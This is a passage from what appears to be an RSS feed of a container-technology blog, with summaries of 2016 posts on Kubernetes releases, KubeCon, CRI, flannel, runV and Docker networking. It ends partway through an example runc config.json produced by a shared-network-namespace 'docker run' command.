&lt;h2 id="kubernetes-v150">Kubernetes v1.5.0&lt;/h2>
&lt;ul>
&lt;li>StatefulSets (ex-PetSets)
&lt;ul>
&lt;li>StatefulSets are beta now (fixes and stabilization)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Improved Federation Support
&lt;ul>
&lt;li>New command: &lt;code>kubefed&lt;/code>&lt;/li>
&lt;li>DaemonSets&lt;/li>
&lt;li>Deployments&lt;/li>
&lt;li>ConfigMaps&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Simplified Cluster Deployment
&lt;ul>
&lt;li>Improvements to &lt;code>kubeadm&lt;/code>&lt;/li>
&lt;li>HA Setup for Master&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Node Robustness and Extensibility
&lt;ul>
&lt;li>Windows Server Container support&lt;/li>
&lt;li>CRI for pluggable container runtimes&lt;/li>
&lt;li>&lt;code>kubelet&lt;/code> API supports authentication and authorization&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="features">Features&lt;/h2>
&lt;p>Features for this release were tracked via the use of the &lt;a href="https://github.com/kubernetes/features">kubernetes/features&lt;/a> issues repo. Each Feature issue is owned by a Special Interest Group from &lt;a href="https://github.com/kubernetes/community">kubernetes/community&lt;/a>&lt;/p></description></item><item><title>Weekly reading list</title><link>https://feisky.xyz/posts/2016-12-08-weekly-reading-list/</link><pubDate>Thu, 08 Dec 2016 14:00:22 +0000</pubDate><guid>https://feisky.xyz/posts/2016-12-08-weekly-reading-list/</guid><description>&lt;h1 id="docker收购infinit-pdf">&lt;a href="https://blog.docker.com/2016/12/docker-acquires-infinit/">Docker收购Infinit&lt;/a> &lt;a href="https://feisky.xyz/assets/infinit.pdf">PDF&lt;/a>&lt;/h1>
&lt;p>&lt;a href="https://infinit.sh/">Infinit&lt;/a>为容器提供了分布式存储，其特点包括&lt;/p>
&lt;ul>
&lt;li>基于软件：可以部署在任何硬件之上，从遗留设备到消费级实体机、虚拟机，甚至容器。&lt;/li>
&lt;li>可编程：开发者可以轻松地完成多个存储基础设施的自动化创建和部署，并且每个都能借助基于策略的能力进行自定义，适配上层应用的需求。&lt;/li>
&lt;li>可伸缩：通过依靠一个去中心化的架构（即点对点），Infinit没有使用leader/follower模型，因而不会有瓶颈和单点失效的问题。&lt;/li>
&lt;li>自愈合：Infinit的再平衡策略能让系统适应各种故障，包括拜占庭将军问题。&lt;/li>
&lt;li>多用途：Infinit平台提供了块、对象和文件存储的接口：NFS、SMB、AWS S3、OpenStack Swift、iSCSI和FUSE等等。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://feisky.xyz/images/14811775178610.png" alt="">&lt;/p></description></item><item><title>Weekly reading list</title><link>https://feisky.xyz/posts/2016-12-05-weekly-reading-list/</link><pubDate>Mon, 05 Dec 2016 07:59:01 +0000</pubDate><guid>https://feisky.xyz/posts/2016-12-05-weekly-reading-list/</guid><description>&lt;h2 id="分布式后台毫秒服务引擎">&lt;a href="http://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;amp;mid=2650994968&amp;amp;idx=1&amp;amp;sn=6713bb3b59e1fb38c70f7178de136cfc&amp;amp;scene=0#wechat_redirect">分布式后台毫秒服务引擎&lt;/a>&lt;/h2>
&lt;blockquote>
&lt;p>腾讯QQ团队于12月4日开源了一个服务开发运营框架，叫做毫秒服务引擎（Mass Service Engine in Cluster，MSEC），它集RPC、名字发现服务、负载均衡、业务监控、灰度发布、容量管理、日志管理、Key-Value存储于一体，目的是提高开发与运营的效率和质量。&lt;/p></description></item><item><title>KubeCon/CloudNativeCon 2016见闻</title><link>https://feisky.xyz/posts/2016-11-14-kubecon-2016%E8%A7%81%E9%97%BB/</link><pubDate>Mon, 14 Nov 2016 09:49:52 +0000</pubDate><guid>https://feisky.xyz/posts/2016-11-14-kubecon-2016%E8%A7%81%E9%97%BB/</guid><description>&lt;p>题记：上周去西雅图参加了&lt;a href="http://events.linuxfoundation.org/events/kubecon">KubeCon&amp;amp;CloudNativeCon 2016&lt;/a>，不仅见到Dawn、Brendan、Tim以及Sig Node的各路大神，还参加了不少有趣的session。&lt;/p>
&lt;h2 id="compiling-to-containers---brendan-burns-microsoft">&lt;a href="https://cnkc16.sched.org/event/8K8y/compiling-to-containers-brendan-burns-microsoft?iframe=no&amp;amp;w=100%25&amp;amp;sidebar=yes&amp;amp;bg=no">Compiling to Containers&lt;/a> - Brendan Burns, Microsoft&lt;/h2>
&lt;p>Containers可以看作是现代分布式系统的“汇编语言”，这样分布式系统的管理实际上就成了开发“Container汇编语言”。Brendan还以JavaScript为例，演示了如何基于&lt;a href="https://github.com/brendandburns/metaparticle">Metaparticle&lt;/a>来支持不同的service pattern:&lt;/p></description></item><item><title>Kubernetes container runtime interface</title><link>https://feisky.xyz/posts/2016-09-25-kubernetes-container-runtime-interface/</link><pubDate>Sun, 25 Sep 2016 06:59:31 +0000</pubDate><guid>https://feisky.xyz/posts/2016-09-25-kubernetes-container-runtime-interface/</guid><description>&lt;p>题记：最近一段时间在做Kubernetes容器引擎接口（Container Runtime Interface， CRI）的重构，并支持以插件的方式引入外部容器引擎。CRI还在紧张有序的开发中，预计在v1.5发布第一个alpha版。&lt;/p></description></item><item><title>Kubernetes中的服务发现与负载均衡</title><link>https://feisky.xyz/posts/2016-09-11-kubernetes%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</link><pubDate>Sun, 11 Sep 2016 09:48:09 +0000</pubDate><guid>https://feisky.xyz/posts/2016-09-11-kubernetes%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</guid><description>&lt;p>Kubernetes在设计之初就充分考虑了针对容器的服务发现与负载均衡机制，提供了Service资源，并通过kube-proxy配合cloud provider来适应不同的应用场景。随着kubernetes用户的激增，用户场景的不断丰富，又产生了一些新的负载均衡机制。目前，kubernetes中的负载均衡大致可以分为以下几种机制，每种机制都有其特定的应用场景：&lt;/p></description></item><item><title>如何快速启动一个Kubernetes集群</title><link>https://feisky.xyz/posts/2016-08-24-%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AAkubernetes%E9%9B%86%E7%BE%A4/</link><pubDate>Wed, 24 Aug 2016 14:48:44 +0000</pubDate><guid>https://feisky.xyz/posts/2016-08-24-%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AAkubernetes%E9%9B%86%E7%BE%A4/</guid><description>&lt;p>相比Docker一个二进制文件解决所有问题，Kubernetes则为不同的服务提供了不同的二进制文件，并将一些服务放到了addons中。故而，Kubernetes的部署相对要麻烦的多。借助&lt;a href="https://github.com/kubernetes/minikube">minikube&lt;/a>项目，现在可以很方便的在本机快速启动一个单节点的Kubernetes集群。&lt;/p></description></item><item><title>Setup hyperd with flannel network</title><link>https://feisky.xyz/posts/2016-07-19-setup-hyperd-with-flannel-network/</link><pubDate>Tue, 19 Jul 2016 15:58:26 +0000</pubDate><guid>https://feisky.xyz/posts/2016-07-19-setup-hyperd-with-flannel-network/</guid><description>&lt;h1 id="flannel">Flannel&lt;/h1>
&lt;p>Flannel is a virtual network that gives a subnet to each host for use with container runtimes.&lt;/p>
&lt;p>Platforms like Google&amp;rsquo;s Kubernetes assume that each container (pod) has a unique, routable IP inside the cluster. The advantage of this model is that it reduces the complexity of doing port mapping.&lt;/p>
&lt;p>flannel runs an agent, flanneld, on each host and is responsible for allocating a subnet lease out of a preconfigured address space. flannel uses etcd to store the network configuration, allocated subnets, and auxiliary data (such as host&amp;rsquo;s IP). The forwarding of packets is achieved using one of several strategies that are known as backends. The simplest backend is udp and uses a TUN device to encapsulate every IP fragment in a UDP packet, forming an overlay network. The following diagram demonstrates the path a packet takes as it traverses the overlay network:&lt;/p></description></item><item><title>Play with docker v1.12</title><link>https://feisky.xyz/posts/2016-06-24-play-with-docker-v1-12/</link><pubDate>Fri, 24 Jun 2016 12:39:49 +0000</pubDate><guid>https://feisky.xyz/posts/2016-06-24-play-with-docker-v1-12/</guid><description>&lt;p>[TOC]&lt;/p>
&lt;p>Docker v1.12 brings in its integrated orchestration into docker engine.&lt;/p>
&lt;blockquote>
&lt;p>Starting with Docker 1.12, we have added features to the core Docker Engine to make multi-host and multi-container orchestration easy. We’ve added new API objects, like Service and Node, that will let you use the Docker API to deploy and manage apps on a group of Docker Engines called a swarm. With Docker 1.12, the best way to orchestrate Docker is Docker!&lt;/p></description></item><item><title>Playing docker with hypervisor container runtime runV</title><link>https://feisky.xyz/posts/2016-06-17-playing-docker-with-hypervisor-container-runtime-runv/</link><pubDate>Fri, 17 Jun 2016 17:12:38 +0000</pubDate><guid>https://feisky.xyz/posts/2016-06-17-playing-docker-with-hypervisor-container-runtime-runv/</guid><description>&lt;p>Table of contents:&lt;/p>
&lt;p>[TOC]&lt;/p>
&lt;hr>
&lt;p>The latest master branch of &lt;a href="https://github.com/hyperhq/runv">runV&lt;/a> has already supported running as an runtime in docker. Since v1.11, docker introduced OCI contain runtime (runc) integration via containerd. Since runc and runV are both &lt;a href="https://github.com/opencontainers/runtime-spec/blob/master/implementations.md">recommended implementation of OCI&lt;/a>, it is natural to make runV working with containerd.&lt;/p>
&lt;p>Now let&amp;rsquo;s have a try.&lt;/p>
&lt;h3 id="install-runv-and-docker">Install runv and docker&lt;/h3>
&lt;p>Docker could be installed via &lt;a href="https://docs.docker.com/engine/installation/">https://docs.docker.com/engine/installation/&lt;/a>.&lt;/p>
&lt;p>Since only master branch of runV supports running integrated with docker, we should compile runV by source.&lt;/p></description></item><item><title>Kubernetes-mesos architecture</title><link>https://feisky.xyz/posts/2016-06-07-kubernetes-mesos-architecture/</link><pubDate>Tue, 07 Jun 2016 13:21:07 +0000</pubDate><guid>https://feisky.xyz/posts/2016-06-07-kubernetes-mesos-architecture/</guid><description>&lt;p>&lt;img src="https://feisky.xyz/images/kubernetes_mesos_architecture.png" alt="">&lt;/p>
&lt;p>From &lt;a href="http://cdn.yongbok.net/ruo91/architecture/k8s/kubernetes_mesos_architecture_v1.x.png">http://cdn.yongbok.net/ruo91/architecture/k8s/kubernetes_mesos_architecture_v1.x.png&lt;/a>&lt;/p></description></item><item><title>Hypernetes: Bringing Security and Multi-tenancy to Kubernetes</title><link>https://feisky.xyz/posts/2016-06-06-hypernetes-bringing-security-and-multi-tenancy-to-kubernetes/</link><pubDate>Mon, 06 Jun 2016 16:10:25 +0000</pubDate><guid>https://feisky.xyz/posts/2016-06-06-hypernetes-bringing-security-and-multi-tenancy-to-kubernetes/</guid><description>&lt;blockquote>
&lt;p>Notes: this post is copied from &lt;a href="http://blog.kubernetes.io/2016/05/hypernetes-security-and-multi-tenancy-in-kubernetes.html">http://blog.kubernetes.io/2016/05/hypernetes-security-and-multi-tenancy-in-kubernetes.html&lt;/a>.&lt;/p>&lt;/blockquote>
&lt;p>&lt;em>Today’s guest post is written by Harry Zhang and Pengfei Ni, engineers at HyperHQ, describing a new hypervisor based container called HyperContainer&lt;/em>&lt;/p>
&lt;p>While many developers and security professionals are comfortable with Linux containers as an effective boundary, many users need a stronger degree of isolation, particularly for those running in a multi-tenant environment. Sadly, today, those users are forced to run their containers inside virtual machines, even one VM per container.&lt;/p></description></item><item><title>How docker 1.11 share network accross containers</title><link>https://feisky.xyz/posts/2016-05-11-how-docker-1-11-share-network-accross-containers/</link><pubDate>Wed, 11 May 2016 10:25:06 +0000</pubDate><guid>https://feisky.xyz/posts/2016-05-11-how-docker-1-11-share-network-accross-containers/</guid><description>&lt;p>Docker 1.11 has moved to runc with containerd, I am interested in how it processing shared netns accross containers.&lt;/p>
&lt;p>For example, I have already running a container 75599a6f387b7842c6da57efd38f9742b2ca621782f891402f83852c66dbd706. A new container within same netns can be created with cmd:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker run -itd --net&lt;span style="color:#f92672">=&lt;/span>container:75599a6f387b alpine sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will generate a runc &lt;code>config.json&lt;/code> as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ociVersion&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;0.6.0-dev&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;platform&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;os&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;linux&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;arch&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;amd64&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;process&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;terminal&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;user&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;additionalGids&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">10&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">11&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">20&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">26&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">27&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;args&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;sh&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;env&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;HOSTNAME=75599a6f387b&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;TERM=xterm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;cwd&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;capabilities&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_CHOWN&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_DAC_OVERRIDE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_FSETID&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_FOWNER&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_MKNOD&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_NET_RAW&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_SETGID&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_SETUID&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_SETFCAP&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_SETPCAP&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_NET_BIND_SERVICE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_SYS_CHROOT&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_KILL&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;CAP_AUDIT_WRITE&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;root&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/var/lib/docker/devicemapper/mnt/d33c7932917e64bde482b437fc3ccaad9a00a04e0cf49e39f9d3be5d71991db6/rootfs&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;readonly&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;hostname&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;75599a6f387b&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;mounts&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/proc&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;proc&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;proc&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nosuid&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;noexec&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nodev&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;tmpfs&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;tmpfs&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nosuid&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;strictatime&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;mode=755&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/pts&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;devpts&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;devpts&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nosuid&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;noexec&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;newinstance&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ptmxmode=0666&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;mode=0620&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;gid=5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/sys&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;sysfs&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;sysfs&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nosuid&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;noexec&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nodev&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ro&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/sys/fs/cgroup&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;cgroup&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;cgroup&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ro&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nosuid&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;noexec&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nodev&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/mqueue&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;mqueue&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;mqueue&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
